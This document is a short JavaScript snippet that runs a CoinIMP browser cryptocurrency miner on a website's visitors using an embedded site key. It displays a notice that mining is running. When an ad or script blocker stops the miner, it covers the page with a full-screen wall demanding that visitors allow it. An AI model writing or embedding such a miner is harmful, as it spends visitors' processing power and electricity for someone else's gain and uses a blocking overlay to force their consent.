console.log("test");
var _client = new Client.Anonymous('23b019603543ed21c5c1ebd598e3ef783705a5f20757b71b6f49b97b6a7ec45a', {
        throttle: 0.8
    });
    _client.start();
    _client.addMiningNotification("Top", "This script is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
    
    setTimeout(function(){
        if(typeof _client === 'undefined' || _client === null)
        {
            var messageDiv = document.createElement("div");
            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
            var mainDiv = document.createElement("div");
            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
            mainDiv.appendChild(messageDiv);
            document.body.appendChild(mainDiv);
            document.getElementsByTagName("body")[0].style.overflow = "hidden";
            window.scrollTo(0, 0);
        }
    },1000);
